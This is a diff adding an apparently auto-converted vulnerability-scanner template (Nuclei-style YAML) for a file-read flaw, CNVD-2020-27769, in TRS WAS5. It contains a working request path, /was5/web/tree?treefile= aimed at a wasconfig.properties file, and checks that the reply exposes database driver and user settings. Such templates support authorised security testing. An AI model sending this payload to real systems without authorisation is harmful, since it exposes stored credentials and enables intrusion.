@@ -1,0 +1,35 @@
+id: yaml-poc-trs-trs_was5-readfile-CNVD-2020-27769
+info:
+  name: Yaml Poc Trs Trs_Was5 Readfile Cnvd 2020 27769
+  author: converted
+  severity: medium
+  description: 'Converted from xpoc: yaml-poc-trs-trs_was5-readfile-CNVD-2020-27769'
+  tags: lfi
+  reference:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2020-27769
+http:
+- method: GET
+  path:
+  - /was5/web
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - /was5/admin/images
+- method: GET
+  path:
+  - /was5/web/tree?treefile=/WEB-INF/classes/com/trs/was/resource/wasconfig.properties
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - sysdriver
+    - sysuser
